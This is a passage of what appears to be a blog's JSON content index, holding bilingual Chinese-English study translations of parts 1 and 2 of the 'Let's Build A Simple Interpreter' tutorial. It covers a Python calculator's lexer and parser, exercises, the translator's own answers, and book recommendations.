Token(PLUS, '+') if self.current_char == '-': self.advance() return Token(MINUS, '-') if self.current_char == '*': self.advance() return Token(MUL, '*') if self.current_char == '/': self.advance() return Token(DIV, '/') self.error() return Token(EOF, None) def eat(self, token_type): # compare the current token type with the passed token # type and if they match then &quot;eat&quot; the current token # and assign the next token to the self.current_token, # otherwise raise an exception. if self.current_token.type == token_type: self.current_token = self.get_next_token() else: self.error() def expr(self): &quot;&quot;&quot;Parser / Interpreter expr -&gt; INTEGER PLUS INTEGER expr -&gt; INTEGER MINUS INTEGER &quot;&quot;&quot; # set current token to the first token taken from the input self.current_token = self.get_next_token() # we expect the current token to be an integer left = self.current_token self.eat(INTEGER) # we expect the current token to be either a '+' or '-' op = self.current_token if op.type == PLUS: self.eat(PLUS) elif op.type == MINUS: self.eat(MINUS) elif op.type == MUL: self.eat(MUL) else: self.eat(DIV) # we expect the current token to be an integer right = self.current_token self.eat(INTEGER) # after the above call the self.current_token is set to # EOF token # at this point either the INTEGER PLUS INTEGER or # the INTEGER MINUS INTEGER sequence of tokens # has been successfully found and the method can just # return the result of adding or subtracting two integers, # thus effectively interpreting client input if op.type == PLUS: result = left.value + right.value elif op.type == MINUS: result = left.value - right.value elif op.type == MUL: result = left.value * right.value elif op.type == DIV: if right.value == 0: result = 'ERROR' else: result = left.value / right.value return result def main(): while True: try: text = input('calc&gt; ') except EOFError: break if not text: continue interpreter = Interpreter(text) result = interpreter.expr() print(result) if __name__ == '__main__': main() Modify the code to interpret expressions containing an arbitrary number of additions and subtractions, for example “9 - 5 + 3 + 11” 修改代码以解释任意数目的加减法，例如“9-5 + 3 + 11” Check your understanding. 检查你的理解。 What is a lexeme? 什么是词位？ 构成token的字符序列 What is the name of the process that finds the structure in the stream of tokens, or put differently, what is the name of the process that recognizes a certain phrase in that stream of tokens? 在token流中查找结构的过程的名称是什么，或者换句话说，在token流中识别特定短语的过程的名称是什么？ 解析（parsing） What is the name of the part of the interpreter (compiler) that does parsing? 解释器(编译器)进行解析（parsing）的那部分的名称是什么？ 解析器（parsers） I hope you liked today’s material. In the next article of the series you will extend your calculator to handle more complex arithmetic expressions. Stay tuned. 我希望你喜欢今天的材料。在本系列的下一篇文章中，您将扩展计算器以处理更复杂的算术表达式。请继续关注。 And here is a list of books I recommend that will help you in your study of interpreters and compilers: 下面是我推荐的一些书籍，它们可以帮助你学习解释器和编译器: Language Implementation Patterns: Create Your Own Domain-Specific and General Programming Languages (Pragmatic Programmers) 语言实现模式: 创建您自己的特定领域和通用编程语言(实用程序员) Writing Compilers and Interpreters: A Software Engineering Approach 编写编译器和解释器: 一种软件工程方法 Modern Compiler Implementation in Java 现代编译器在 Java 中的实现 Modern Compiler Design 现代编译器设计 Compilers: Principles, Techniques, and Tools (2nd Edition) 编译器: 原理、技术和工具(第二版) All articles in this series: 本系列的所有文章: Let's Build A Simple Interpreter. Part 1. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 2. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 3. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 4. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 5. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 6. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 7: Abstract Syntax Trees 让我们构建一个简单的解释器。第7部分: 抽象语法树 Let's Build A Simple Interpreter. Part 8. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 9. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 10. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 11. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 12. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 13: Semantic Analysis 让我们建立一个简单的解释器。第13部分: 语义分析 Let's Build A Simple Interpreter. Part 14: Nested Scopes and a Source-to-Source Compiler 让我们构建一个简单的解释器。第14部分: 嵌套作用域和源到源编译器 Let's Build A Simple Interpreter. Part 15. 让我们构建一个简单的解释器。第15部分 Let's Build A Simple Interpreter. Part 16: Recognizing Procedure Calls 让我们建立一个简单的解释器。第16部分: 识别过程调用 Let's Build A Simple Interpreter. Part 17: Call Stack and Activation Records 让我们构建一个简单的解释器。第17部分: 调用堆栈和激活记录 Let's Build A Simple Interpreter. Part 18: Executing Procedure Calls 让我们构建一个简单的解释器。第18部分: 执行过程调用 Let's Build A Simple Interpreter. Part 19: Nested Procedure Calls 让我们构建一个简单的解释器。第19部分: 嵌套过程调用 ","link":"https://lzxzl.github.io/post/fan-yi-yu-xue-xi-lets-build-a-simple-interpreter-part2/"},{"title":"[翻译与学习] Let’s Build A Simple Interpreter. Part1.","content":" “If you don’t know how compilers work, then you don’t know how computers work. If you’re not 100% sure whether you know how compilers work, then you don’t know how they work.” — Steve Yegge “如果你不知道编译器是如何工作的，那么你就不知道计算机是如何工作的。如果你不能100% 确定你是否知道编译器是如何工作的，那么你就是不知道它们是如何工作的。”ー Steve Yegge There you have it. Think about it. It doesn’t really matter whether you’re a newbie or a seasoned software developer: if you don’t know how compilers and interpreters work, then you don’t know how computers work. It’s that simple. 这就对了。想想吧。不管你是新手还是经验丰富的软件开发人员，这都不重要: 如果你不知道编译器和解释器是如何工作的，那么你就不知道计算机是如何工作的。就是这么简单。 So, do you know how compilers and interpreters work? And I mean, are you 100% sure that you know how they work? If you don’t. 那么，你知道编译器和解释器是如何工作的吗？我的意思是，你100% 确定你知道它们是如何工作的吗？如果你不知道。 Or if you don’t and you’re really agitated about it. 或者如果你不知道并且你真的对此感到焦虑。 Do not worry. If you stick around and work through the series and build an interpreter and a compiler with me you will know how they work in the end. And you will become a confident happy camper too. At least I hope so. 别担心。如果你坚持读完这个系列，和我一起构建一个解释器和一个编译器，你最终就会知道它们是如何工作的。你也会成为一个自信快乐的露营者。至少我希望如此。（露营者？？是一个我不知道的英语典故吗？） Why would you study interpreters and compilers? I will give you three reasons. 为什么要学习解释器和编译器? 我给你三个理由。 To write an interpreter or a compiler you have to have a lot of technical skills that you need to use together. Writing an interpreter or a compiler will help you improve those skills and become a better software developer. As well, the skills you will learn are useful in writing any software, not just interpreters or compilers. 要编写一个解释器或编译器，你必须具备需要一起使用的许多技能。编写一个解释器或编译器将帮助你提高这些技能，并成为一个更好的软件开发人员。同时，你学到的技能对编写任何软件都是有用的，而不仅仅是解释器或编译器。 You really want to know how computers work. Often interpreters and compilers look like magic. And you shouldn’t be comfortable with that magic. You want to demystify the process of building an interpreter and a compiler, understand how they work, and get in control of things. 你真的很想知道电脑是怎么工作的。通常解释器和编译器看起来像魔法，你不应该安于使用这种魔法。你希望了解构建解释器和编译器的过程，了解它们是如何工作的。 You want to create your own programming language or domain specific language. If you create one, you will also need to create either an interpreter or a compiler for it. Recently, there has been a resurgence of interest in new programming languages. And you can see a new programming language pop up almost every day: Elixir, Go, Rust just to name a few. 你希望创建自己的编程语言或针对某个领域特定的语言。如果你创建了一个，你也需要为它创建一个解释器或者一个编译器。最近，人们对新编程语言的兴趣重新燃起。你可以看到几乎每天都有一种新的编程语言出现: Elixir、Go和Rust 等等。 Okay, but what are interpreters and compilers? 好的，但是什么是解释器和编译器呢？ The goal of an interpreter or a compiler is to translate a source program in some high-level language into some other form. Pretty vague, isn’t it? Just bear with me, later in the series you will learn exactly what the source program is translated into. 解释器或编译器的目标是将某种高级语言中的源程序翻译成另一种形式。很模糊是吗？请耐心等待，在本系列的后面，你将了解源程序到底被翻译成了什么。 At this point you may also wonder what the difference is between an interpreter and a compiler. For the purpose of this series, let’s agree that if a translator translates a source program into machine language, it is a compiler. If a translator processes and executes the source program without translating it into machine language first, it is an interpreter. Visually it looks something like this: 在这一点上，你可能还想知道解释器和编译器之间的区别。对于本系列文章，我们一致认为，如果翻译器将源程序翻译成机器语言，那么它就是编译器。如果翻译器在没有先将源程序翻译成机器语言的情况下处理并执行源程序，那么它就是一个解释器。从视觉上看是这样的: I hope that by now you’re convinced that you really want to study and build an interpreter and a compiler. What can you expect from this series on interpreters? 我希望到目前为止，你已经确信您真的想学习并构建一个解释器和编译器。你能从这个关于解释器的系列文章中期待些什么呢？ Here is the deal. You and I are going to create a simple interpreter for a large subset of Pascal language. At the end of this series you will have a working Pascal interpreter and a source-level debugger like Python’s pdb. 是这样的，我们将为 Pascal 语言的一个大子集创建一个简单的解释器。在本系列的最后，你将拥有一个可用的 Pascal 解释器和一个源代码级别的调试器，如 Python 的 pdb。 You might ask, why Pascal? For one thing, it’s not a made-up language that I came up with just for this series: it’s a real programming language that has many important language constructs. And some old, but useful, CS books use Pascal programming language in their examples (I understand that that’s not a particularly compelling reason to choose a language to build an interpreter for, but I thought it would be nice for a change to learn a non-mainstream language 😃 你可能会问，为什么是Pascal？首先，它不是我为这个系列编写的虚构语言: 它是一种真正的编程语言，具有许多重要的语言结构。一些古老但有用的 CS 书籍在他们的例子中使用 Pascal 编程语言（我知道这并不是一个特别有说服力的理由去选择一种语言来建立一个解释器，但是我认为学习一种非主流语言是一个很好的改变:) Here is an example of a factorial function in Pascal that you will be able to interpret with your own interpreter and debug with the interactive source-level debugger that you will create along the way: 这里有一个 Pascal 语言的阶乘函数的例子，你可以用你自己的解释器来解释它，并且可以用你一路创建的交互式源代码级调试器来进行调试: The implementation language of the Pascal interpreter will be Python, but you can use any language you want because the ideas presented don’t depend on any particular implementation language. Okay, let’s get down to business. Ready, set, go! Pascal 解释器的实现语言是 Python，但是你可以使用任何你想使用的语言，因为所提出的想法不依赖于任何特定的实现语言。好了，我们开始谈正事吧。准备，预备，开始！ You will start your first foray into interpreters and compilers by writing a simple interpreter of arithmetic expressions, also known as a calculator. Today the goal is pretty minimalistic: to make your calculator handle the addition of two single digit integers like 3+5. Here is the source code for your calculator, sorry, interpreter: 您将通过编写一个简单的算术表达式解释器（也称为计算器）来开始对解释器和编译器进行第一次尝试。今天的目标是非常简单的：让你的计算器处理两个整数数字的加法，比如3 + 5。下面是你的计算器/解释器的源代码: Save the above code into calc1.py file or download it directly from GitHub. Before you start digging deeper into the code, run the calculator on the command line and see it in action. Play with it! Here is a sample session on my laptop (if you want to run the calculator under Python3 you will need to replace raw_input with input): 将上面的代码保存到 calc1.py 文件中，或者直接从 GitHub 下载。在开始深入研究代码之前，请在命令行上运行该计算器并查看其实际操作。玩吧！下面是我笔记本电脑上的一个示例： For your simple calculator to work properly without throwing an exception, your input needs to follow certain rules: 为了让你的简单计算器正常工作而不引发异常，你的输入需要遵循一定的规则: Only single digit integers are allowed in the input 输入中只允许个位整数 The only arithmetic operation supported at the moment is addition 目前唯一支持的算术运算是加法 No whitespace characters are allowed anywhere in the input 输入中的任何地方都不允许有空格字符 Those restrictions are necessary to make the calculator simple. Don’t worry, you’ll make it pretty complex pretty soon. 这些限制对于简化计算器是必要的。不必担心，很快你就会把它变得相当复杂。 Okay, now let’s dive in and see how your interpreter works and how it evaluates arithmetic expressions. 好，现在让我们深入了解解释器是如何工作的，以及它如何计算算术表达式的。 When you enter an expression 3+5 on the command line your interpreter gets a string “3+5”. In order for the interpreter to actually understand what to do with that string it first needs to break the input “3+5” into components called tokens. A token is an object that has a type and a value. For example, for the string “3” the type of the token will be INTEGER and the corresponding value will be integer 3. 当你在命令行中输入表达式3 + 5时，你的解释器将得到一个字符串“3 + 5”。为了让解释器真正理解如何处理这个字符串，它首先需要将输入“3 + 5”分解为称为token的组件。token是具有类型（type）和值（value）的对象。例如，对于字符串“3”，token的类型为 INTEGER，相应的值为整数 3。 The process of breaking the input string into tokens is called lexical analysis. So, the first step your interpreter needs to do is read the input of characters and convert it into a stream of tokens. The part of the interpreter that does it is called a lexical analyzer, or lexer for short. You might also encounter other names for the same component, like scanner or tokenizer. They all mean the same: the part of your interpreter or compiler that turns the input of characters into a stream of tokens. 将输入字符串分解成token的过程称为词法分析。因此，你的解释器需要完成的第一步是读取字符输入并将其转换为token流。解释器中做这项工作的部分称为词法分析器，简称lexer。你还可能会遇到lexer的其他名称，如扫描器（scanner）或标记器（tokenizer）。它们的意思都是一样的： 解释器或编译器中将字符输入转换为token流的部分。 The method get_next_token of the Interpreter class is your lexical analyzer. Every time you call it, you get the next token created from the input of characters passed to the interpreter. Let’s take a closer look at the method itself and see how it actually does its job of converting characters into tokens. The input is stored in the variable text that holds the input string and pos is an index into that string (think of the string as an array of characters). pos is initially set to 0 and points to the character ‘3’. The method first checks whether the character is a digit and if so, it increments pos and returns a token instance with the type INTEGER and the value set to the integer value of the string ‘3’, which is an integer 3: Interpreter 类的 get_next _ token 方法是词法分析器。每次调用它时，都会得到通过传递给解释器的字符输入创建的下一个token。让我们仔细研究一下这个方法本身，看看它实际上是如何将字符转换为token的。输入存储在变量text中，pos 是该字符串的索引（可以将字符串看作一个字符数组）。pos 最初设置为0，并指向字符“3”。该方法首先检查字符是否为数字，如果是，则递增 pos 并返回一个token实例，其类型为 INTEGER，值设置为字符串‘3’的整数值，即整数3: The pos now points to the ‘+’ character in the text. The next time you call the method, it tests if a character at the position pos is a digit and then it tests if the character is a plus sign, which it is. As a result the method increments pos and returns a newly created token with the type PLUS and value ‘+’: pos现在指向文本中的“ +”字符。下次调用该方法时，它将检查位置 pos 处的字符是否为数字，然后检查该字符是否为加号（它确实是加号）。因此，该方法使pos自增并返回一个新创建的token，其类型为 PLUS，值为 ‘+’ : The pos now points to character ‘5’. When you call the get_next_token method again the method checks if it’s a digit, which it is, so it increments pos and returns a new INTEGER token with the value of the token set to integer 5: pos现在指向字符“5”。当你再次调用 get _ next _ token 方法时，这个方法会检查它是否是一个数字，确实是一个数字，所以它会自增 pos 并返回一个新的 INTEGER token，其值设置为整数5: Because the pos index is now past the end of the string “3+5” the get_next_token method returns the EOF token every time you call it: 因为 pos 索引现在已经超过了字符串“3 + 5”的结尾，所以 get _ next _ token 方法在每次调用它时都返回 EOF token: Try it out and see for yourself how the lexer component of your calculator works: 试一试，看看你的计算器的 lexer 组件是如何工作的: So now that your interpreter has access to the stream of tokens made from the input characters, the interpreter needs to do something with it: it needs to find the structure in the flat stream of tokens it gets from the lexer get_next_token. Your interpreter expects to find the following structure in that stream: INTEGER -&gt; PLUS -&gt; INTEGER. That is, it tries to find a sequence of tokens: integer followed by a plus sign followed by an integer. 因此，既然你的解释器可以访问由输入字符转换的token流，那么解释器就需要对其进行处理: 它需要在通过词法分析器的get_next_token 获得的平面token流中找到结构。你的解释器期望在该流中找到以下结构: INTEGER-&gt; PLUS-&gt; INTEGER。也就是说，它试图找到一个token序列: 先是整数，然后是加号，最后是整数。 The method responsible for finding and interpreting that structure is expr. This method verifies that the sequence of tokens does indeed correspond to the expected sequence of tokens, i.e INTEGER -&gt; PLUS -&gt; INTEGER. After it’s successfully confirmed the structure, it generates the result by adding the value of the token on the left side of the PLUS and the right side of the PLUS, thus successfully interpreting the arithmetic expression you passed to the interpreter. 发现和解释该结构的方法是expr。此方法验证token序列确实与token的预期序列（即 INTEGER-&gt; PLUS-&gt; INTEGER）相对应。在成功地确认结构之后，它通过在 PLUS 的左侧和 PLUS 的右侧添加token值来生成结果，从而成功地解释传递给解释器的算术表达式。 The expr method itself uses the helper method eat to verify that the token type passed to the eat method matches the current token type. After matching the passed token type the eat method gets the next token and assigns it to the current_token variable, thus effectively “eating” the currently matched token and advancing the imaginary pointer in the stream of tokens. If the structure in the stream of tokens doesn’t correspond to the expected INTEGER PLUS INTEGER sequence of tokens the eat method throws an exception. expr 方法本身使用 帮助方法 eat 来验证传递给 eat 方法的预期 token类型是否与当前token的类型匹配。如果匹配，则 eat 方法获取下一个token并将其赋值给当前的 current_token 变量，从而有效地“吃掉”当前匹配的token并在token流中推进“虚指针”（pos）。如果token流中的结构不符合预期的“INTEGER PLUS INTEGER”，则 eat 方法抛出异常。 Let’s recap what your interpreter does to evaluate an arithmetic expression: 让我们来回顾一下你的解释器是如何计算算术表达式的: The interpreter accepts an input string, let’s say “3+5” 解释器接受输入字符串，比如说“3 + 5” The interpreter calls the expr method to find a structure in the stream of tokens returned by the lexical analyzer get_next_token. The structure it tries to find is of the form INTEGER PLUS INTEGER. After it’s confirmed the structure, it interprets the input by adding the values of two INTEGER tokens because it’s clear to the interpreter at that point that what it needs to do is add two integers, 3 and 5. 解释器调用expr方法来查找由词汇分析器的get_next_token返回的token流中的结构。它试图找到结构为“INTEGER PLUS INTEGER”的形式。在确认结构之后，它通过添加两个INTEGER toekn的值来解释输入，因为它在该点处对解释器清晰地表示，它需要做的是添加两个整数，3和5。 Congratulate yourself. You’ve just learned how to build your very first interpreter! 祝贺你自己，你刚刚学会了如何建立你的第一个解释器！ Now it’s time for exercises. 现在是练习的时间了。 You didn’t think you would just read this article and that would be enough, did you? Okay, get your hands dirty and do the following exercises: 你不会认为你只是读了这篇文章就足够了吧？好的，把你的手“弄脏”（emmm），做以下练习: Modify the code to allow multiple-digit integers in the input, for example “12+3” 修改代码以允许输入中有多个数字的整数，例如“12 + 3” Add a method that skips whitespace characters so that your calculator can handle inputs with whitespace characters like ” 12 + 3” 添加跳过空格字符的方法，以便计算器可以处理空格字符(如“12 + 3”)的输入 Modify the code and instead of ‘+’ handle ‘-‘ to evaluate subtractions like “7-5” 修改代码，用“ +”代替“-”来计算减法，比如“7-5” 我的答案： Check your understanding What is an interpreter? 什么是翻译器？ 是一种计算机程序，能够把解释型语言解释执行。解释器就像一位“中间人”。解释器边解释边执行，因此依赖于解释器的程序运行速度比较缓慢。 What is a compiler? 什么是编译器？ 是一种计算机程序，它会将某种编程语言写成的源代码（原始语言）转换成另一种编程语言（目标语言）。 What’s the difference between an interpreter and a compiler? 解释器和编译器有什么区别？ What is a token? 什么是token？ token是具有类型和值的对象 What is the name of the process that breaks input apart into tokens? 将输入分解成toekn的的过程称是什么？ 词法分析 What is the part of the interpreter that does lexical analysis called? 解释器中词法分析的那部分是什么？ 词法分析器 What are the other common names for that part of an interpreter or a compiler? 解释器或编译器的这一部分的其他常用名称是什么？ 扫描器或标记器 scanner or tokenizer Before I finish this article, I really want you to commit to studying interpreters and compilers. And I want you to do it right now. Don’t put it on the back burner. Don’t wait. If you’ve skimmed the article, start over. If you’ve read it carefully but haven’t done exercises - do them now. If you’ve done only some of them, finish the rest. You get the idea. And you know what? Sign the commitment pledge to start learning about interpreters and compilers today! 在我完成这篇文章之前，我真的希望您能致力于研究解释器和编译器。我希望你现在就做。不要把它放在次要地位。不要等待。如果你已经浏览了这篇文章，那就重新开始细读。如果你已经仔细阅读了它，但是还没有做练习，那么现在就做。如果你只完成了其中的一部分，那就完成剩下的。签署承诺，今天就开始学习解释器和编译器！ I, **_****_****_****_**____, of being sound mind and body, do hereby pledge to commit to studying interpreters and compilers starting today and get to a point where I know 100% how they work! 我，作为一个身心健康的人，在此承诺从今天开始学习解释器和编译器，直到我完全了解它们是如何工作的！ Signature: Date: Sign it, date it, and put it somewhere where you can see it every day to make sure that you stick to your commitment. And keep in mind the definition of commitment: 签名，注明日期，并把它放在你每天都能看到的地方，以确保你遵守你的承诺。记住承诺的定义: “Commitment is doing the thing you said you were going to do long after the mood you said it in has left you.” — Darren Hardy “承诺就是在你所说的情绪离开你很久之后，仍然去做你所说的事情。”ー Darren Hardy Okay, that’s it for today. In the next article of the mini series you will extend your calculator to handle more arithmetic expressions. Stay tuned. 好了，今天就到这里。在下一篇文章中，你将扩展计算器来处理更多的算术表达式。请继续关注。 If you can’t wait for the second article and are chomping at the bit to start digging deeper into interpreters and compilers, here is a list of books I recommend that will help you along the way: 如果你迫不及待地想看第二篇文章，迫不及待地开始深入研究解释器和编译器，这里有一个我推荐的书目列表，它们会一路帮助你: Language Implementation Patterns: Create Your Own Domain-Specific and General Programming Languages (Pragmatic Programmers) 语言实现模式: 创建您自己的特定领域和通用编程语言(实用程序员) Writing Compilers and Interpreters: A Software Engineering Approach 编写编译器和解释器: 一种软件工程方法 Modern Compiler Implementation in Java 现代编译器在 Java 中的实现 Modern Compiler Design 现代编译器设计 Compilers: Principles, Techniques, and Tools (2nd Edition) 编译器: 原理、技术和工具(第二版) All articles in this series: 本系列的所有文章: Let's Build A Simple Interpreter. Part 1. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 2. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 3. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 4. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 5. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 6. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 7: Abstract Syntax Trees 让我们构建一个简单的解释器。第7部分: 抽象语法树 Let's Build A Simple Interpreter. Part 8. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 9. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 10. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 11. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 12. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 13: Semantic Analysis 让我们建立一个简单的解释器。第13部分: 语义分析 Let's Build A Simple Interpreter. Part 14: Nested Scopes and a Source-to-Source Compiler 让我们构建一个简单的解释器。第14部分: 嵌套作用域和源到源编译器 Let's Build A Simple Interpreter. Part 15. 让我们构建一个简单的解释器。第15部分 Let's Build A Simple Interpreter. Part 16: Recognizing Procedure Calls 让我们建立一个简单的解释器。第16部分: 识别过程调用 Let's Build A Simple Interpreter. Part 17: Call Stack and Activation Records 让我们构建一个简单的解释器。第17部分: 调用堆栈和激活记录 Let's Build A Simple Interpreter. Part 18: Executing Procedure Calls 让我们构建一个简单的解释器。第18部分: 执行过程调用 Let's Build A Simple Interpreter. Part 19: Nested Procedure Calls 让我们构建一个简单的解释器。第19部分: 嵌套过程调用 ","link":"https://lzxzl.github.io/post/fan-yi-yu-xue-xi-lets-build-a-simple-interpreter-part1/"}]}